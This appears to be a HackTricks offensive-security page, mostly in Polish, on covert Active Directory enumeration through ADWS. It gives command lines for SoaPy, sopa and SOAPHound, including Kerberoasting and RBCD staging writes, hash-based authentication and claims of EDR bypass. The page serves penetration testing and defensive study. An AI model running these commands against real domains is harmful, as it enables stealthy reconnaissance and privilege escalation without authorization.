# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS) jest **włączony domyślnie na każdym kontrolerze domeny od Windows Server 2008 R2** i nasłuchuje na TCP **9389**. Pomimo nazwy, **nie ma tu HTTP**. Zamiast tego usługa udostępnia dane w stylu LDAP przez stos zastrzeżonych protokołów .NET:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Ponieważ ruch jest enkapsulowany wewnątrz tych binarnych ramek SOAP i odbywa się przez rzadko używany port, **enumeracja przez ADWS jest znacznie mniej prawdopodobna do inspekcji, filtrowania lub wykrycia podpisami niż klasyczny ruch LDAP/389 & 636**. Dla operatorów oznacza to:

* Bardziej ukryte rozpoznanie – zespoły Blue często koncentrują się na zapytaniach LDAP.
* Możliwość kolekcjonowania z **hostów nie-Windows (Linux, macOS)** przez tunelowanie 9389/TCP przez SOCKS.
* Te same dane, które uzyskałbyś przez LDAP (użytkownicy, grupy, ACL, schemat itp.) oraz możliwość wykonywania **zapisów** (np. `msDs-AllowedToActOnBehalfOfOtherIdentity` dla **RBCD**).

Interakcje ADWS są realizowane przez WS-Enumeration: każde zapytanie zaczyna się od wiadomości `Enumerate`, która definiuje filtr/atrybuty LDAP i zwraca GUID `EnumerationContext`, po której następuje jedna lub więcej wiadomości `Pull`, które strumieniują wyniki do okna zdefiniowanego przez serwer. Konteksty wygasają po ~30 minutach, więc narzędzia muszą stronicować wyniki lub dzielić filtry (zapytania prefiksowe per CN), aby nie utracić stanu. Przy żądaniu descriptorów bezpieczeństwa należy określić kontrolkę `LDAP_SERVER_SD_FLAGS_OID`, aby pominąć SACLs, w przeciwnym razie ADWS po prostu usuwa atrybut `nTSecurityDescriptor` z odpowiedzi SOAP.

> NOTE: ADWS jest także używany przez wiele narzędzi RSAT GUI/PowerShell, więc ruch może mieszać się z legalną aktywnością administratorów.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) to **pełna reimplementacja stosu protokołów ADWS w czystym Pythonie**. Tworzy ramki NBFX/NBFSE/NNS/NMF bajt po bajcie, umożliwiając zbieranie informacji z systemów Unix-like bez użycia środowiska .NET.

### Key Features

* Obsługa **proxy przez SOCKS** (przydatne z implantów C2).
* Precyzyjne filtry wyszukiwania identyczne z LDAP `-q '(objectClass=user)'`.
* Opcjonalne **operacje zapisu** ( `--set` / `--delete` ).
* **BOFHound output mode** do bezpośredniego wczytania do BloodHound.
* Flaga `--parse` do upiększania timestampów / `userAccountControl` gdy wymagana jest czytelność dla człowieka.

### Targeted collection flags & write operations

SoaPy dostarcza wyselekcjonowane przełączniki, które replikują najczęstsze zadania łowieckie LDAP przez ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, oraz surowe przełączniki `--query` / `--filter` do niestandardowych pobrań. Połącz to z prymitywami zapisu takimi jak `--rbcd <source>` (ustawia `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging dla docelowego Kerberoasting) oraz `--asrep` (flips `DONT_REQ_PREAUTH` w `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Użyj tego samego hosta/poświadczeń, aby natychmiast wykorzystać wyniki: wyeksportuj obiekty obsługujące RBCD za pomocą `--rbcds`, następnie zastosuj `--rbcd 'WEBSRV01$' --account 'FILE01$'`, aby przygotować łańcuch Resource-Based Constrained Delegation (zobacz [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) dla pełnej ścieżki nadużycia).

### Instalacja (host operatora)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump przez ADWS (Linux/Windows)

* Fork of `ldapdomaindump`, który zamienia zapytania LDAP na wywołania ADWS przez TCP/9389, aby zmniejszyć wykrycia sygnatur LDAP.
* Wykonuje wstępne sprawdzenie dostępności portu 9389, chyba że podano `--force` (pomija sondę, jeśli skanowanie portów jest głośne/filtrowane).
* Testowane przeciwko Microsoft Defender for Endpoint i CrowdStrike Falcon z udanym obejściem opisanym w README.

### Instalacja
```bash
pipx install .
```
### Użycie
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Typowe wyjście rejestruje sprawdzenie dostępności 9389, ADWS bind oraz rozpoczęcie/zakończenie dumpu:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - A practical client for ADWS in Golang

Podobnie jak soapy, [sopa](https://github.com/Macmod/sopa) implementuje stos protokołów ADWS (MS-NNS + MC-NMF + SOAP) w Golang, udostępniając opcje wiersza poleceń do wykonywania wywołań ADWS, takich jak:

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* oraz inne, np. `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

### Protocol mapping highlights

* Wyszukiwania w stylu LDAP są wykonywane za pomocą **WS-Enumeration** (`Enumerate` + `Pull`) z projekcją atrybutów, kontrolą zakresu (Base/OneLevel/Subtree) oraz paginacją.
* Pobieranie pojedynczego obiektu używa **WS-Transfer** `Get`; zmiany atrybutów używają `Put`; usuwanie używa `Delete`.
* Wbudowane tworzenie obiektów korzysta z **WS-Transfer ResourceFactory**; obiekty niestandardowe używają **IMDA AddRequest** sterowanego szablonami YAML.
* Operacje na hasłach to akcje **MS-ADCAP** (`SetPassword`, `ChangePassword`).

### Unauthenticated metadata discovery (mex)

ADWS udostępnia WS-MetadataExchange bez poświadczeń, co jest szybkim sposobem na sprawdzenie, czy usługa jest wystawiona przed uwierzytelnieniem:
```bash
sopa mex --dc <DC>
```
### Wykrywanie DNS/DC i uwagi dotyczące targetowania Kerberos

Sopa może rozwiązywać DC przez SRV, jeśli `--dc` jest pominięty i `--domain` jest podany. Wykonuje zapytania w następującej kolejności i używa celu o najwyższym priorytecie:
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Operacyjnie preferuj resolver kontrolowany przez DC, aby uniknąć problemów w segmentowanych środowiskach:

* Użyj `--dns <DC-IP>`, aby **wszystkie** zapytania SRV/PTR/forward przechodziły przez DNS DC.
* Użyj `--dns-tcp`, gdy UDP jest zablokowany lub odpowiedzi SRV są duże.
* Jeśli Kerberos jest włączony i `--dc` jest adresem IP, sopa wykonuje **reverse PTR**, aby uzyskać FQDN w celu poprawnego targetowania SPN/KDC. Jeśli Kerberos nie jest używany, zapytanie PTR nie jest wykonywane.

Example (IP + Kerberos, forced DNS via the DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Opcje materiałów uwierzytelniających

Poza hasłami w postaci jawnej, sopa obsługuje **NT hashes**, **Kerberos AES keys**, **ccache** oraz **PKINIT certificates** (PFX lub PEM) do uwierzytelniania ADWS. Kerberos jest implikowany przy użyciu `--aes-key`, `-c` (ccache) lub opcji opartych na certyfikatach.
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Custom object creation via templates

Dla dowolnych klas obiektów polecenie `create custom` przyjmuje szablon YAML mapujący do IMDA `AddRequest`:

* `parentDN` i `rdn` określają kontener i względny DN.
* `attributes[].name` obsługuje `cn` lub z przestrzenią nazw `addata:cn`.
* `attributes[].type` akceptuje `string|int|bool|base64|hex` lub jawne `xsd:*`.
* Nie dołączaj `ad:relativeDistinguishedName` ani `ad:container-hierarchy-parent`; sopa je wstrzykuje.
* Wartości `hex` są konwertowane na `xsd:base64Binary`; użyj `value: ""`, aby ustawić puste ciągi.

## SOAPHound – zbieranie ADWS o dużej przepustowości (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) to kolektor .NET, który utrzymuje wszystkie interakcje LDAP wewnątrz ADWS i generuje JSON zgodny z BloodHound v4. Tworzy jednorazowo kompletny cache `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` (`--buildcache`), a następnie ponownie używa go do masowych przebiegów `--bhdump`, `--certdump` (ADCS) lub `--dnsdump` (AD-integrated DNS), dzięki czemu tylko ~35 krytycznych atrybutów opuszcza DC. AutoSplit (`--autosplit --threshold <N>`) automatycznie dzieli zapytania według prefiksu CN, aby pozostać poniżej 30-minutowego limitu EnumerationContext w dużych lasach.

Typowy przebieg pracy na VM operatora dołączonego do domeny:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Wyeksportowane pliki JSON można bezpośrednio wykorzystać w workflowach SharpHound/BloodHound — zobacz [BloodHound methodology](bloodhound.md) dla pomysłów na dalsze tworzenie grafów. AutoSplit sprawia, że SOAPHound jest odporny w środowiskach z wielomilionowymi obiektami, jednocześnie utrzymując liczbę zapytań niższą niż snapshoty w stylu ADExplorer.

## Ukryty proces zbierania AD

Poniższy proces pokazuje, jak enumerować **obiekty domeny & ADCS** przez ADWS, konwertować je do BloodHound JSON i wyszukiwać ścieżki ataku oparte na certyfikatach – wszystko z Linuxa:

1. **Tunnel 9389/TCP** z sieci celu do twojej maszyny (np. via Chisel, Meterpreter, SSH dynamic port-forward, itd.). Eksportuj `export HTTPS_PROXY=socks5://127.0.0.1:1080` lub użyj opcji SoaPy’s `--proxyHost/--proxyPort`.

2. **Zbierz obiekt domeny root:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Zbierz obiekty związane z ADCS z Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Konwertuj do BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Prześlij ZIP** w BloodHound GUI i uruchom zapytania cypher, takie jak `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, aby ujawnić ścieżki eskalacji certyfikatów (ESC1, ESC8, itd.).

### Zapisanie `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Połącz to z `s4u2proxy`/`Rubeus /getticket` dla pełnego łańcucha **Resource-Based Constrained Delegation** (zobacz [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Podsumowanie narzędzi

| Cel | Narzędzie | Uwagi |
|---------|------|-------|
| enumeracja ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| Masowy zrzut ADWS | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| Import do BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Konwertuje logi SoaPy/ldapsearch |
| Przejęcie certyfikatu | [Certipy](https://github.com/ly4k/Certipy) | Może być przekierowane przez ten sam SOCKS |
| Enumeracja ADWS i zmiany obiektów | [sopa](https://github.com/Macmod/sopa) | Uniwersalny klient do komunikacji ze znanymi endpointami ADWS - pozwala na enumerację, tworzenie obiektów, modyfikację atrybutów oraz zmiany haseł |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Sopa GitHub](https://github.com/Macmod/sopa)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
